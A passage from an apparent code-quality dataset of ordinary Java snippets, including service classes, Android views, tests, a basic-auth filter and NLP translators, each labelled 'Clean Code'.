    stack.remove(t);
    if (stack.size() >= sizeOfStack - 1) {
      stack.remove(0);
    }
    stack.add(t);
  }
  public String pop(){
    String t=peek();
    if (stack.size() > 0) {
      stack.remove(stack.size() - 1);
    }
    return t;
  }
  public boolean remove(  String item){
    return stack.remove(item);
  }
  public boolean contains(  String t){
    return stack.contains(t);
  }
  public List<String> getItemList(){
    return new ArrayList<>(stack);
  }
  @Override public int hashCode(){
    StringBuilder stringBuilder=new StringBuilder();
    for (    String str : stack) {
      stringBuilder.append(str);
    }
    return Objects.hash(stringBuilder.toString());
  }
  public static void main(  String[] args){
    Stack stack=new Stack();
    stack.hashCode();
    System.out.println(stack.peek());
    System.out.println(stack.isEmpty());
    stack.push(""java"");
    stack.push(""is"");
    stack.push(""beautiful"");
    stack.push(""language"");
    System.out.println(stack.hashCode());
    System.out.println(stack.pop());
    stack.push(""language"");
    System.out.println(stack.hashCode());
    System.out.println(stack.isEmpty());
    System.out.println(stack.peek());
  }
}
",0,Clean Code
"/** 
 * 腾讯课堂搜索【咕泡学院】 官网：www.gupaoedu.com 风骚的Mic 老师 create-date: 2019/7/30-下午11:51
 */
@Slf4j @Service public class MemberServiceImpl implements IMemberService {
  @Autowired MemberMapper memberMapper;
  @Autowired IUserLoginService userLoginService;
  @Autowired MemberConverter memberConverter;
  /** 
 * 根据用户id查询用户会员信息
 * @param request
 * @return
 */
  @Override public QueryMemberResponse queryMemberById(  QueryMemberRequest request){
    QueryMemberResponse queryMemberResponse=new QueryMemberResponse();
    try {
      request.requestCheck();
      Member member=memberMapper.selectByPrimaryKey(request.getUserId());
      if (member == null) {
        queryMemberResponse.setCode(SysRetCodeConstants.DATA_NOT_EXIST.getCode());
        queryMemberResponse.setMsg(SysRetCodeConstants.DATA_NOT_EXIST.getMessage());
      }
      queryMemberResponse=memberConverter.member2Res(member);
      queryMemberResponse.setCode(SysRetCodeConstants.SUCCESS.getCode());
      queryMemberResponse.setMsg(SysRetCodeConstants.SUCCESS.getMessage());
    }
 catch (    Exception e) {
      log.error(""MemberServiceImpl.queryMemberById Occur Exception :"" + e);
      ExceptionProcessorUtils.wrapperHandlerException(queryMemberResponse,e);
    }
    return queryMemberResponse;
  }
  @Override public HeadImageResponse updateHeadImage(  HeadImageRequest request){
    HeadImageResponse response=new HeadImageResponse();
    return response;
  }
  @Override public UpdateMemberResponse updateMember(  UpdateMemberRequest request){
    UpdateMemberResponse response=new UpdateMemberResponse();
    try {
      request.requestCheck();
      CheckAuthRequest checkAuthRequest=new CheckAuthRequest();
      checkAuthRequest.setToken(request.getToken());
      CheckAuthResponse authResponse=userLoginService.validToken(checkAuthRequest);
      if (!authResponse.getCode().equals(SysRetCodeConstants.SUCCESS.getCode())) {
        response.setCode(authResponse.getCode());
        response.setMsg(authResponse.getMsg());
        return response;
      }
      Member member=memberConverter.updateReq2Member(request);
      int row=memberMapper.updateByPrimaryKeySelective(member);
      response.setMsg(SysRetCodeConstants.SUCCESS.getMessage());
      response.setCode(SysRetCodeConstants.SUCCESS.getCode());
      log.info(""MemberServiceImpl.updateMember effect row :"" + row);
    }
 catch (    Exception e) {
      log.error(""MemberServiceImpl.updateMember Occur Exception :"" + e);
      ExceptionProcessorUtils.wrapperHandlerException(response,e);
    }
    return response;
  }
}",0,Clean Code
"/** 
 * 自提门店 Service 接口
 * @author jason
 */
public interface DeliveryPickUpStoreService {
  /** 
 * 创建自提门店
 * @param createReqVO 创建信息
 * @return 编号
 */
  Long createDeliveryPickUpStore(  @Valid DeliveryPickUpStoreCreateReqVO createReqVO);
  /** 
 * 更新自提门店
 * @param updateReqVO 更新信息
 */
  void updateDeliveryPickUpStore(  @Valid DeliveryPickUpStoreUpdateReqVO updateReqVO);
  /** 
 * 删除自提门店
 * @param id 编号
 */
  void deleteDeliveryPickUpStore(  Long id);
  /** 
 * 获得自提门店
 * @param id 编号
 * @return 自提门店
 */
  DeliveryPickUpStoreDO getDeliveryPickUpStore(  Long id);
  /** 
 * 获得自提门店列表
 * @param ids 编号
 * @return 自提门店列表
 */
  List<DeliveryPickUpStoreDO> getDeliveryPickUpStoreList(  Collection<Long> ids);
  /** 
 * 获得指定状态的自提门店列表
 * @param status 状态
 * @return 自提门店列表
 */
  List<DeliveryPickUpStoreDO> getDeliveryPickUpStoreListByStatus(  Integer status);
  /** 
 * 获得自提门店分页
 * @param pageReqVO 分页查询
 * @return 自提门店分页
 */
  PageResult<DeliveryPickUpStoreDO> getDeliveryPickUpStorePage(  DeliveryPickUpStorePageReqVO pageReqVO);
  /** 
 * 绑定自提店员
 * @param bindReqVO 绑定数据
 */
  void bindDeliveryPickUpStore(  DeliveryPickUpBindReqVO bindReqVO);
}
",0,Clean Code
"public class DefaultEMNodPointer extends AbstractNodePointer implements EMNodPointer {
  private static final Logger logger=LoggerFactory.getLogger(DefaultEMNodPointer.class);
  private Node node;
  public DefaultEMNodPointer(  Node node){
    this.node=node;
  }
  /** 
 * 与该远程指针关联的node信息
 * @return
 */
  @Override public Node getNode(){
    return node;
  }
  @Override public EngineNode createEngine(  EngineConnLaunchRequest engineConnLaunchRequest){
    logger.info(""Start to createEngine ask em "" + getNode().getServiceInstance());
    Object result=getSender().ask(engineConnLaunchRequest);
    if (result instanceof EngineNode) {
      EngineNode engineNode=(EngineNode)result;
      logger.info(""Succeed to createEngine ask em "" + getNode().getServiceInstance() + "", engineNode ""+ engineNode);
      return engineNode;
    }
 else {
      throw new LinkisRetryException(AMConstant.ENGINE_ERROR_CODE,""Failed to createEngine ask em "" + getNode().getServiceInstance() + ""result: ""+ result);
    }
  }
  @Override public void stopEngine(  EngineStopRequest engineStopRequest){
    try {
      Object result=getSender().ask(engineStopRequest);
      if (result instanceof EngineStopResponse) {
        EngineStopResponse engineStopResponse=(EngineStopResponse)result;
        if (!engineStopResponse.getStopStatus()) {
          logger.info(""Kill engine : "" + engineStopRequest.getServiceInstance().toString() + "" failed, because ""+ engineStopResponse.getMsg()+ "" . Will ask engine to suicide."");
        }
 else {
          logger.info(""Succeed to kill engine "" + engineStopRequest.getServiceInstance().toString() + ""."");
        }
      }
 else {
        logger.warn(""Ask em : "" + getNode().getServiceInstance().toString() + "" to kill engine : ""+ engineStopRequest.getServiceInstance().toString()+ "" failed, response is : ""+ BDPJettyServerHelper.gson().toJson(result)+ ""."");
      }
    }
 catch (    Exception e) {
      logger.warn(""Ask em : "" + getNode().getServiceInstance().toString() + "" to kill engine : ""+ engineStopRequest.getServiceInstance().toString()+ "" failed, exception is : ""+ e.getMessage()+ ""."");
    }
  }
  @Override public ECMOperateResponse executeOperation(  ECMOperateRequest ecmOperateRequest){
    Object result=getSender().ask(ecmOperateRequest);
    if (result instanceof ECMOperateResponse) {
      return (ECMOperateResponse)result;
    }
 else {
      throw new AMErrorException(AMConstant.ENGINE_ERROR_CODE,""Failed to execute ECM operation."");
    }
  }
}
",0,Clean Code
"/** 
 * Tests for  {@link ConstructorBindingValueSupplier}.
 * @author Stephane Nicoll
 */
class ConstructorBindingValueSupplierTests {
  @Test void bindConfigurationProperties(){
    MockEnvironment environment=new MockEnvironment().withProperty(""test.name"",""Hello"").withProperty(""test.counter"",""42"");
    try (GenericApplicationContext context=refreshContext(environment)){
      Object instance=ConstructorBindingValueSupplier.bind(context.getBeanFactory(),""test"",SampleConfigurationProperties.class);
      assertThat(instance).isInstanceOfSatisfying(SampleConfigurationProperties.class,(sample) -> {
        assertThat(sample.name).isEqualTo(""Hello"");
        assertThat(sample.counter).isEqualTo(42);
      }
);
    }
   }
  @Test void bindFailureIncludeRelevantException(){
    MockEnvironment environment=new MockEnvironment().withProperty(""test.name"",""fail"").withProperty(""test.counter"",""42"");
    try (GenericApplicationContext context=refreshContext(environment)){
      assertThatThrownBy(() -> ConstructorBindingValueSupplier.bind(context.getBeanFactory(),""test"",SampleConfigurationProperties.class)).isInstanceOf(ConfigurationPropertiesBindException.class).hasMessageContaining(""test"").hasMessageContaining(SampleConfigurationProperties.class.getName());
    }
   }
  private GenericApplicationContext refreshContext(  ConfigurableEnvironment environment){
    GenericApplicationContext context=new GenericApplicationContext();
    context.setEnvironment(environment);
    ConfigurationPropertiesBindingPostProcessor.register(context);
    context.refresh();
    return context;
  }
@ConfigurationProperties(""test"") @ConstructorBinding static class SampleConfigurationProperties {
    private final String name;
    private final Integer counter;
    public SampleConfigurationProperties(    String name,    Integer counter){
      if (""fail"".equals(name)) {
        throw new IllegalArgumentException(""fail"");
      }
      this.name=name;
      this.counter=counter;
    }
  }
}
",0,Clean Code
"/** 
 * This service is used to handle SQL submission tasks 
 */
public interface SparkSqlService extends IService<SparkSql> {
  /** 
 * Create SparkSQL
 * @param sparkSql SparkSql will create
 */
  void create(  SparkSql sparkSql);
  /** 
 * Set Candidate about application and SQL.
 * @param candidateTypeEnum CandidateTypeEnum
 * @param appId application id
 * @param sqlId SparkSQL id
 */
  void setCandidate(  CandidateTypeEnum candidateTypeEnum,  Long appId,  Long sqlId);
  /** 
 * @param appId Application id
 * @param decode Whether to choose decode
 * @return SparkSQL
 */
  SparkSql getEffective(  Long appId,  boolean decode);
  /** 
 * get latest one SparkSQL by application id
 * @param appId Application id
 * @param decode Whether to choose decode
 * @return SparkSQL of the latest
 */
  SparkSql getLatestSparkSql(  Long appId,  boolean decode);
  /** 
 * Get all historical SQL through Application
 * @param appId Application id
 * @return list of History SparkSQL
 */
  List<SparkSql> listSparkSqlHistory(  Long appId);
  /** 
 * Get SparkSQL by Application id and Candidate Type
 * @param appId Application id
 * @param type CandidateTypeEnum
 * @return SparkSQL
 */
  SparkSql getCandidate(  Long appId,  CandidateTypeEnum type);
  /** 
 * @param appId Application id
 * @param sqlId SparkSQL id
 */
  void toEffective(  Long appId,  Long sqlId);
  /** 
 * clean all candidate
 * @param id SparkSQL id
 */
  void cleanCandidate(  Long id);
  /** 
 * Remove SparkSQL by Application id
 * @param appId Application id
 */
  void removeByAppId(  Long appId);
  /** 
 * SparkSQL rollback
 * @param application SparkApplication
 */
  void rollback(  SparkApplication application);
  /** 
 * Verify whether the entered SQL is correct
 * @param sql SQL
 * @param versionId SparkENV version id
 * @return SparkSqlValidationResult Check the correctness of SQL
 */
  SparkSqlValidationResult verifySql(  String sql,  Long versionId);
  /** 
 * List all SparkSQL by each SparkSQL team id
 * @param teamId SparkSQL team id
 * @return list of SparkSQL
 */
  List<SparkSql> listByTeamId(  Long teamId);
  /** 
 * Retrieves a page of  {@link SparkSql} objects based on the provided parameters.
 * @param appId Application id
 * @param request request The {@link RestRequest} object used for pagination and sorting.
 * @return An {@link IPage} containing the retrieved {@link SparkSql} objects.
 */
  IPage<SparkSql> getPage(  Long appId,  RestRequest request);
}
",0,Clean Code
"@AllArgsConstructor public class PrefManager {
  private IPrefManager server;
  @SneakyThrows public boolean putInt(  String key,  int value){
    return server.putInt(key,value);
  }
  @SneakyThrows public int getInt(  String key,  int def){
    return server.getInt(key,def);
  }
  @SneakyThrows public boolean putString(  String key,  String value){
    return server.putString(key,value);
  }
  @SneakyThrows public String getString(  String key,  String def){
    return server.getString(key,def);
  }
  @SneakyThrows public boolean putBoolean(  String key,  boolean value){
    return server.putBoolean(key,value);
  }
  @SneakyThrows public boolean getBoolean(  String key,  boolean def){
    return server.getBoolean(key,def);
  }
  @SneakyThrows public boolean putLong(  String key,  long value){
    return server.putLong(key,value);
  }
  @SneakyThrows public long getLong(  String key,  long def){
    return server.getLong(key,def);
  }
  @SneakyThrows public boolean registerSettingsChangeListener(  PrefChangeListener listener){
    return server.registerSettingsChangeListener(listener.getListener());
  }
  @SneakyThrows public boolean unRegisterSettingsChangeListener(  PrefChangeListener listener){
    return server.unRegisterSettingsChangeListener(listener.getListener());
  }
}
",0,Clean Code
"public class StickTileView extends ViewGroup implements NestedScrollingParent2 {
  private static final String TAG=StickTileView.class.getSimpleName();
  private View topView;
  private View indicationView;
  private View bottomView;
  public StickTileView(  Context context,  AttributeSet attrs){
    super(context,attrs);
  }
  @Override protected void onMeasure(  int widthMeasureSpec,  int heightMeasureSpec){
    ensureView();
    final int height=MeasureSpec.getSize(heightMeasureSpec);
    measureChild(topView,widthMeasureSpec,heightMeasureSpec);
    measureChild(indicationView,widthMeasureSpec,heightMeasureSpec);
    measureChild(bottomView,widthMeasureSpec,MeasureSpec.makeMeasureSpec(height - indicationView.getMeasuredHeight(),MeasureSpec.AT_MOST));
    final int desireHeight=topView.getMeasuredHeight() + indicationView.getMeasuredHeight() + bottomView.getMeasuredHeight();
    setMeasuredDimension(widthMeasureSpec,Math.min(desireHeight,height));
  }
  /** 
 * 从上往下布局
 */
  @Override protected void onLayout(  boolean changed,  int l,  int t,  int r,  int b){
    int topOffset=0;
    topView.layout(0,topOffset,topView.getMeasuredWidth(),topOffset + topView.getMeasuredHeight());
    topOffset+=topView.getMeasuredHeight();
    indicationView.layout(0,topOffset,indicationView.getMeasuredWidth(),topOffset + indicationView.getMeasuredHeight());
    topOffset+=indicationView.getMeasuredHeight();
    bottomView.layout(0,topOffset,bottomView.getMeasuredWidth(),topOffset + bottomView.getMeasuredHeight());
  }
  private void ensureView(){
    if (getChildCount() < 3) {
      throw new IllegalStateException();
    }
    topView=getChildAt(0);
    indicationView=getChildAt(1);
    bottomView=getChildAt(2);
  }
  @Override public boolean onStartNestedScroll(  @NonNull View child,  @NonNull View target,  int axes,  int type){
    return (axes & ViewCompat.SCROLL_AXIS_VERTICAL) != 0;
  }
  @Override public void onNestedScrollAccepted(  @NonNull View child,  @NonNull View target,  int axes,  int type){
  }
  @Override public void onStopNestedScroll(  @NonNull View target,  int type){
  }
  @Override public void onNestedScroll(  @NonNull View target,  int dxConsumed,  int dyConsumed,  int dxUnconsumed,  int dyUnconsumed,  int type){
  }
  @Override public void onNestedPreScroll(  @NonNull View target,  int dx,  int dy,  @NonNull int[] consumed,  int type){
    boolean showTop=dy < 0 && getScrollY() > 0 && !bottomView.canScrollVertically(-1);
    boolean hideTop=dy > 0 && getScrollY() < topView.getMeasuredHeight();
    if (showTop || hideTop) {
      scrollBy(0,dy);
      consumed[1]=dy;
    }
  }
  @Override public void scrollTo(  int x,  int y){
    if (y <= 0) {
      y=0;
    }
    if (y >= topView.getMeasuredHeight()) {
      y=topView.getMeasuredHeight();
    }
    super.scrollTo(x,y);
  }
}
",0,Clean Code
"@Filter(""/**"") @Requires(property=""endpoints.all.basic-auth"") public class BasicAuthEndpointsFilter implements HttpServerFilter {
  private final EndpointBasicAuthConfiguration endpointBasicAuthConfiguration;
  public BasicAuthEndpointsFilter(  EndpointBasicAuthConfiguration endpointBasicAuthConfiguration){
    this.endpointBasicAuthConfiguration=endpointBasicAuthConfiguration;
  }
  @SuppressWarnings(""rawtypes"") @Override public Publisher<MutableHttpResponse<?>> doFilter(  HttpRequest<?> request,  ServerFilterChain chain){
    Optional<RouteMatch> routeMatch=RouteMatchUtils.findRouteMatch(request);
    if (routeMatch.isPresent() && routeMatch.get() instanceof MethodBasedRouteMatch<?,?>) {
      ExecutableMethod<?,?> method=methodBasedRouteMatch.getExecutableMethod();
      if (method.getAnnotation(Endpoint.class) != null) {
        if (!validateUser(request)) {
          return Publishers.just(HttpResponse.status(HttpStatus.UNAUTHORIZED));
        }
      }
    }
    return chain.proceed(request);
  }
  private boolean validateUser(  HttpRequest<?> request){
    final String authorization=request.getHeaders().get(HttpHeaders.AUTHORIZATION);
    if (authorization != null && authorization.startsWith(HttpHeaderValues.AUTHORIZATION_PREFIX_BASIC)) {
      String base64Credentials=authorization.substring(6);
      byte[] credDecoded=Base64.getDecoder().decode(base64Credentials);
      String credentials=new String(credDecoded,StandardCharsets.UTF_8);
      final String[] values=credentials.split("":"",2);
      if (values.length == 2) {
        return this.endpointBasicAuthConfiguration.getUsername().equals(values[0]) && this.endpointBasicAuthConfiguration.getPassword().equals(values[1]);
      }
    }
    return false;
  }
  @Override public int getOrder(){
    return ServerFilterPhase.SECURITY.order();
  }
}
",0,Clean Code
"/** 
 * Domain-Tag relation repository.
 * @author <a href=""http://88250.b3log.org"">Liang Ding</a>
 * @version 1.1.0.0, Apr 12, 2016
 * @since 1.4.0
 */
@Repository public class DomainTagRepository extends AbstractRepository {
  /** 
 * Public constructor.
 */
  public DomainTagRepository(){
    super(Domain.DOMAIN + ""_"" + Tag.TAG);
  }
  /** 
 * Gets domain-tag relations by the specified domain id.
 * @param domainId       the specified domain id
 * @param currentPageNum the specified current page number, MUST greater then {@code 0}
 * @param pageSize       the specified page size(count of a page contains objects), MUST greater then {@code 0}
 * @return for example      <pre>{ ""pagination"": { ""paginationPageCount"": 88250 }, ""rslts"": [{ ""oId"": """", ""domain_oId"": domainId, ""tag_oId"": """" }, ....] } </pre>
 * @throws RepositoryException repository exception
 */
  public JSONObject getByDomainId(  final String domainId,  final int currentPageNum,  final int pageSize) throws RepositoryException {
    final Query query=new Query().setFilter(new PropertyFilter(Domain.DOMAIN + ""_"" + Keys.OBJECT_ID,FilterOperator.EQUAL,domainId)).setPage(currentPageNum,pageSize).setPageCount(1);
    return get(query);
  }
  /** 
 * Removes domain-tag relations by the specified domain id.
 * @param domainId the specified domain id
 * @throws RepositoryException repository exception
 */
  public void removeByDomainId(  final String domainId) throws RepositoryException {
    final Query query=new Query().setFilter(new PropertyFilter(Domain.DOMAIN + ""_"" + Keys.OBJECT_ID,FilterOperator.EQUAL,domainId));
    remove(query);
  }
  /** 
 * Gets domain-tag relations by the specified tag id.
 * @param tagId          the specified tag id
 * @param currentPageNum the specified current page number, MUST greater then {@code 0}
 * @param pageSize       the specified page size(count of a page contains objects), MUST greater then {@code 0}
 * @return for example      <pre>{ ""pagination"": { ""paginationPageCount"": 88250 }, ""rslts"": [{ ""oId"": """", ""domain_oId"": """", ""tag_oId"": tagId }, ....] } </pre>
 * @throws RepositoryException repository exception
 */
  public JSONObject getByTagId(  final String tagId,  final int currentPageNum,  final int pageSize) throws RepositoryException {
    final Query query=new Query().setFilter(new PropertyFilter(Tag.TAG + ""_"" + Keys.OBJECT_ID,FilterOperator.EQUAL,tagId)).setPage(currentPageNum,pageSize).setPageCount(1);
    return get(query);
  }
}
",0,Clean Code
"public class TestActivityOnCreate extends Activity {
public static class Case extends UseCase {
    @Override public String getName(){
      return ""生命周期测试"";
    }
    @Override public String getSummary(){
      return ""测试Activity的生命周期方法是否正确回调"";
    }
    @Override public Class getPageClass(){
      return TestActivityOnCreate.class;
    }
  }
  @Override protected void onCreate(  @Nullable Bundle savedInstanceState){
    super.onCreate(savedInstanceState);
    setContentView(R.layout.layout_activity_lifecycle);
    ToastUtil.showToast(this,""onCreate"");
  }
  @Override protected void onStart(){
    super.onStart();
    ToastUtil.showToast(this,""onStart"");
  }
  @Override protected void onRestart(){
    super.onRestart();
    ToastUtil.showToast(this,""onRestart"");
  }
  @Override protected void onResume(){
    super.onResume();
    ToastUtil.showToast(this,""onResume"");
  }
  @Override protected void onSaveInstanceState(  Bundle outState){
    super.onSaveInstanceState(outState);
    ToastUtil.showToast(this,""onSaveInstanceState"");
  }
  @Override protected void onRestoreInstanceState(  Bundle savedInstanceState){
    super.onRestoreInstanceState(savedInstanceState);
    ToastUtil.showToast(this,""onRestoreInstanceState"");
  }
  @Override protected void onStop(){
    super.onStop();
    ToastUtil.showToast(this,""onStop"");
  }
  @Override protected void onDestroy(){
    super.onDestroy();
    ToastUtil.showToast(this,""onDestroy"");
  }
}
",0,Clean Code
"public class ResourceTest extends TestCase {
  public void testResource() throws Exception {
    URL sub=ResourceTest.class.getResource(""/sub"");
    URL res=ResourceTest.class.getResource(""/sub/res"");
    assertNotNull(sub);
    assertNotNull(res);
    try (InputStream stream=res.openStream()){
      assertNotNull(stream);
      String content=IOUtils.toString(stream,StandardCharsets.UTF_8);
      Inspector.inspect(content.getBytes(StandardCharsets.UTF_8),""res content"");
    }
     try (InputStream stream=sub.openStream()){
      assertNotNull(stream);
      String content=IOUtils.toString(stream,StandardCharsets.UTF_8);
      Inspector.inspect(content.getBytes(StandardCharsets.UTF_8),""sub content"");
    }
     URLConnection connection=res.openConnection();
    assertNotNull(connection);
    connection.connect();
    connection=sub.openConnection();
    assertNotNull(connection);
    connection.connect();
    URL dylib=Keystone.class.getResource(""/darwin/libkeystone.dylib"");
    assertNotNull(dylib);
    connection=dylib.openConnection();
    assertNotNull(connection);
    connection.connect();
    URL darwin=Keystone.class.getResource(""/darwin"");
    assertNotNull(darwin);
    connection=darwin.openConnection();
    assertNotNull(connection);
    connection.connect();
    assertTrue(true);
  }
}
",0,Clean Code
"/** 
 * This interface defines a complete listener for a parse tree produced by {@link JSONParser}.
 */
public interface JSONListener extends ParseTreeListener {
  /** 
 * Enter a parse tree produced by  {@link JSONParser#json}.
 * @param ctx the parse tree
 */
  void enterJson(  JSONParser.JsonContext ctx);
  /** 
 * Exit a parse tree produced by  {@link JSONParser#json}.
 * @param ctx the parse tree
 */
  void exitJson(  JSONParser.JsonContext ctx);
  /** 
 * Enter a parse tree produced by  {@link JSONParser#obj}.
 * @param ctx the parse tree
 */
  void enterObj(  JSONParser.ObjContext ctx);
  /** 
 * Exit a parse tree produced by  {@link JSONParser#obj}.
 * @param ctx the parse tree
 */
  void exitObj(  JSONParser.ObjContext ctx);
  /** 
 * Enter a parse tree produced by  {@link JSONParser#pair}.
 * @param ctx the parse tree
 */
  void enterPair(  JSONParser.PairContext ctx);
  /** 
 * Exit a parse tree produced by  {@link JSONParser#pair}.
 * @param ctx the parse tree
 */
  void exitPair(  JSONParser.PairContext ctx);
  /** 
 * Enter a parse tree produced by  {@link JSONParser#arr}.
 * @param ctx the parse tree
 */
  void enterArr(  JSONParser.ArrContext ctx);
  /** 
 * Exit a parse tree produced by  {@link JSONParser#arr}.
 * @param ctx the parse tree
 */
  void exitArr(  JSONParser.ArrContext ctx);
  /** 
 * Enter a parse tree produced by  {@link JSONParser#value}.
 * @param ctx the parse tree
 */
  void enterValue(  JSONParser.ValueContext ctx);
  /** 
 * Exit a parse tree produced by  {@link JSONParser#value}.
 * @param ctx the parse tree
 */
  void exitValue(  JSONParser.ValueContext ctx);
}
",0,Clean Code
"public class FileUtils {
  /** 
 * Delete a file or a directory and its children.
 * @param file The directory to delete.
 * @throws IOException Exception when problem occurs during deleting the directory.
 */
  public static void delete(  File file) throws IOException {
    for (    File childFile : file.listFiles()) {
      if (childFile.isDirectory()) {
        delete(childFile);
      }
 else {
        if (!childFile.delete()) {
          throw new IOException();
        }
      }
    }
    if (!file.delete()) {
      throw new IOException();
    }
  }
  public static String readLine(  File file){
    try (BufferedReader reader=new BufferedReader(new FileReader(file))){
      return reader.readLine();
    }
 catch (    Throwable throwable) {
      return """";
    }
  }
  public static void writeLine(  File file,  String line){
    try {
      file.createNewFile();
    }
 catch (    IOException ignored) {
    }
    try (BufferedWriter writer=new BufferedWriter(new FileWriter(file))){
      writer.write(line);
      writer.flush();
    }
 catch (    Throwable throwable) {
      Utils.logE(""error writing line to file "" + file + "": ""+ throwable.getMessage());
    }
  }
  public static String getPackageName(  String dataDir){
    if (TextUtils.isEmpty(dataDir)) {
      Utils.logE(""getPackageName using empty dataDir"");
      return """";
    }
    int lastIndex=dataDir.lastIndexOf(""/"");
    if (lastIndex < 0) {
      return dataDir;
    }
    return dataDir.substring(lastIndex + 1);
  }
  public static String getDataPathPrefix(){
    return ConfigManager.getDataPathPrefix() + ""/"";
  }
}
",0,Clean Code
"/** 
 * A  {@link TranslatorFactory} that creates a {@link QuestionAnsweringTranslator} instance. 
 */
public class QuestionAnsweringTranslatorFactory implements TranslatorFactory, Serializable {
  private static final long serialVersionUID=1L;
  private static final Set<Pair<Type,Type>> SUPPORTED_TYPES=new HashSet<>();
static {
    SUPPORTED_TYPES.add(new Pair<>(QAInput.class,String.class));
    SUPPORTED_TYPES.add(new Pair<>(Input.class,Output.class));
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public Set<Pair<Type,Type>> getSupportedTypes(){
    return SUPPORTED_TYPES;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override @SuppressWarnings(""unchecked"") public <I,O>Translator<I,O> newInstance(  Class<I> input,  Class<O> output,  Model model,  Map<String,?> arguments) throws TranslateException {
    Path modelPath=model.getModelPath();
    try {
      HuggingFaceTokenizer tokenizer=HuggingFaceTokenizer.builder(arguments).optTokenizerPath(modelPath).optManager(model.getNDManager()).build();
      QuestionAnsweringTranslator translator=QuestionAnsweringTranslator.builder(tokenizer,arguments).build();
      if (input == QAInput.class && output == String.class) {
        return (Translator<I,O>)translator;
      }
 else       if (input == Input.class && output == Output.class) {
        return (Translator<I,O>)new QaServingTranslator(translator);
      }
      throw new IllegalArgumentException(""Unsupported input/output types."");
    }
 catch (    IOException e) {
      throw new TranslateException(""Failed to load tokenizer."",e);
    }
  }
}
",0,Clean Code
"/** 
 * A  {@link TextProcessor} that adds a beginning of string and end of string token. 
 */
public class TextTerminator implements TextProcessor {
  private static final String DEFAULT_EOS_TOKEN=""<eos>"";
  private static final String DEFAULT_BOS_TOKEN=""<bos>"";
  private boolean addBosToken;
  private boolean addEosToken;
  private String eosToken;
  private String bosToken;
  /** 
 * Constructs a default  {@link TextTerminator}. 
 */
  public TextTerminator(){
    this(true,true);
  }
  /** 
 * Constructs a  {@link TextTerminator} using the default tokens.
 * @param addBosToken true to add a beginning of text token
 * @param addEosToken true to add an end of text token
 */
  public TextTerminator(  boolean addBosToken,  boolean addEosToken){
    this.addBosToken=addBosToken;
    this.addEosToken=addEosToken;
    this.bosToken=DEFAULT_BOS_TOKEN;
    this.eosToken=DEFAULT_EOS_TOKEN;
  }
  /** 
 * Constructs a  {@link TextTerminator}.
 * @param addBosToken true to add a beginning of text token
 * @param addEosToken true to add an end of text token
 * @param bosToken the token to add to the beginning of the text
 * @param eosToken the token to add to the end of the text
 */
  public TextTerminator(  boolean addBosToken,  boolean addEosToken,  String bosToken,  String eosToken){
    this.addBosToken=addBosToken;
    this.addEosToken=addEosToken;
    this.bosToken=bosToken;
    this.eosToken=eosToken;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public List<String> preprocess(  List<String> tokens){
    List<String> list=new ArrayList<>(tokens.size() + 2);
    if (addBosToken) {
      list.add(bosToken);
    }
    list.addAll(tokens);
    if (addEosToken) {
      list.add(eosToken);
    }
    return list;
  }
}
",0,Clean Code
"/** 
 * Interface for lists of attributes.
 */
public interface AttributeList {
  /** 
 * Get whether this instance is mutable. Note that the {@code AttributeList} interface itself doesn't provide any meansof mutation, but that doesn't mean that there isn't a non-interface way of mutating an instance.
 * @return {@code true} iff this instance is somehow mutable
 */
  public boolean isMutable();
  /** 
 * Get the number of attributes in the list.
 * @return the size
 */
  public int size();
  /** 
 * Get the  {@code n}th attribute.
 * @param n {@code n >= 0, n < size();} which attribute
 * @return {@code non-null;} the attribute in question
 */
  public Attribute get(  int n);
  /** 
 * Get the total length of this list in bytes, when part of a class file. The returned value includes the two bytes for the {@code attributes_count} length indicator.
 * @return {@code >= 2;} the total length, in bytes
 */
  public int byteLength();
  /** 
 * Get the first attribute in the list with the given name, if any.
 * @param name {@code non-null;} attribute name
 * @return {@code null-ok;} first attribute in the list with the given name,or  {@code null} if there is none
 */
  public Attribute findFirst(  String name);
  /** 
 * Get the next attribute in the list after the given one, with the same name, if any.
 * @param attrib {@code non-null;} attribute to start looking after
 * @return {@code null-ok;} next attribute after {@code attrib} with thesame name as  {@code attrib}
 */
  public Attribute findNext(  Attribute attrib);
}
",0,Clean Code
"public class ArgumentCommand extends Argument<CommandResult> {
  public static final int INVALID_COMMAND_ERROR=1;
  private boolean onlyCorrect;
  private String shortcut="""";
  public ArgumentCommand(  @NotNull String id){
    super(id,true,true);
  }
  @NotNull @Override public CommandResult parse(  @NotNull CommandSender sender,  @NotNull String input) throws ArgumentSyntaxException {
    final String commandString=!shortcut.isEmpty() ? shortcut + StringUtils.SPACE + input : input;
    CommandDispatcher dispatcher=MinecraftServer.getCommandManager().getDispatcher();
    CommandResult result=dispatcher.parse(sender,commandString);
    if (onlyCorrect && result.getType() != CommandResult.Type.SUCCESS)     throw new ArgumentSyntaxException(""Invalid command"",input,INVALID_COMMAND_ERROR);
    return result;
  }
  @Override public ArgumentParserType parser(){
    return null;
  }
  public boolean isOnlyCorrect(){
    return onlyCorrect;
  }
  public ArgumentCommand setOnlyCorrect(  boolean onlyCorrect){
    this.onlyCorrect=onlyCorrect;
    return this;
  }
  @NotNull public String getShortcut(){
    return shortcut;
  }
  @ApiStatus.Experimental public ArgumentCommand setShortcut(  @NotNull String shortcut){
    this.shortcut=shortcut;
    return this;
  }
  @Override public String toString(){
    return String.format(""Command<%s>"",getId());
  }
}
",0,Clean Code
"/** 
 * The interface Sorted schema mixin 31.
 * @author bnasslashen
 */
@JsonPropertyOrder(value={""type"",""format"",""if"",""then"",""else""},alphabetic=true) public interface SortedSchemaMixin31 {
  /** 
 * Gets extensions.
 * @return the extensions
 */
  @JsonAnyGetter @JsonPropertyOrder(alphabetic=true) Map<String,Object> getExtensions();
  /** 
 * Gets json schema.
 * @return the json schema
 */
  @JsonIgnore Map<String,Object> getJsonSchema();
  /** 
 * Gets nullable.
 * @return the nullable
 */
  @JsonIgnore Boolean getNullable();
  /** 
 * Gets exclusive minimum.
 * @return the exclusive minimum
 */
  @JsonIgnore Boolean getExclusiveMinimum();
  /** 
 * Gets exclusive maximum.
 * @return the exclusive maximum
 */
  @JsonIgnore Boolean getExclusiveMaximum();
  /** 
 * Gets exclusive minimum value.
 * @return the exclusive minimum value
 */
  @JsonProperty(""exclusiveMinimum"") BigDecimal getExclusiveMinimumValue();
  /** 
 * Gets exclusive maximum value.
 * @return the exclusive maximum value
 */
  @JsonProperty(""exclusiveMaximum"") BigDecimal getExclusiveMaximumValue();
  /** 
 * Gets type.
 * @return the type
 */
